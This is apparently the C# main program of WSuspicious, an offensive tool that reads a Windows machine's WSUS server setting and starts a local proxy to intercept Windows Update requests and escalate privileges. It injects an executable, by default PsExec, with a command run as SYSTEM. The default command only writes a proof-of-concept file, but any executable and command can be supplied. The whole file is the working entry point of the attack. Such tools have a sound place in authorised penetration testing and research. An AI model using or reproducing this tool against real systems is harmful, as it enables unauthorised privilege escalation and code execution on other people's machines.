using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using WSuspicious.Proxy;

namespace WSuspicious
{
    class Program
    {
        public static int Main(string[] args)
        {
            Dictionary<string, string> arguments = ArgumentsParser.parse(args);
            if (arguments.ContainsKey("/help"))
            {
                PrintHelp();
                return 0;
            }

            string wsusConfig = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\", "WUServer", null);
            
            string wsusHost = null;
            bool isHttps = false;
            if (wsusConfig != null)
            {
                Uri wsusURI = new Uri(wsusConfig);
                wsusHost = wsusURI.Host;
                isHttps = wsusURI.Scheme == "https" ? true : false;

                Console.WriteLine(String.Format("Detected {0} WSUS Server - {1}", wsusURI.Scheme, wsusHost));

                WsusProxy proxy = new WsusProxy(wsusHost, isHttps, File.ReadAllBytes(arguments["/exe"]), Path.GetFileName(arguments["/exe"]), arguments["/command"], arguments.ContainsKey("/debug"));
                proxy.Start();

                Console.WriteLine("Hit any key to exit..");
                Console.WriteLine();
                Console.Read();

                proxy.Stop();
            }
            else
            {
                Console.WriteLine("No WSUS Server detected.");
                Console.WriteLine("Stopping now.");
            }
            return 0;
        }

        public static void PrintHelp()
        {
            Console.WriteLine(@"
                Usage: WSuspicious [OPTION]...
                Creates a local proxy to intercept WSUS requests and try to escalate privileges.
                If launched without any arguments, the script will simply create the file C:\\mitmdump_poc.txt

                  /exe                the full path to the executable to run
                                      Known payloads are bginfo and PsExec. (Default: .\PsExec64.exe)
                  /command            the command to execute (Default: -accepteula -s -d cmd /c ""echo 1 > C:\\mitmdump_poc.txt"")
                  /debug              increase the verbosity of the tool
                  /help               display this help and exit
            ");
        }
    }
}
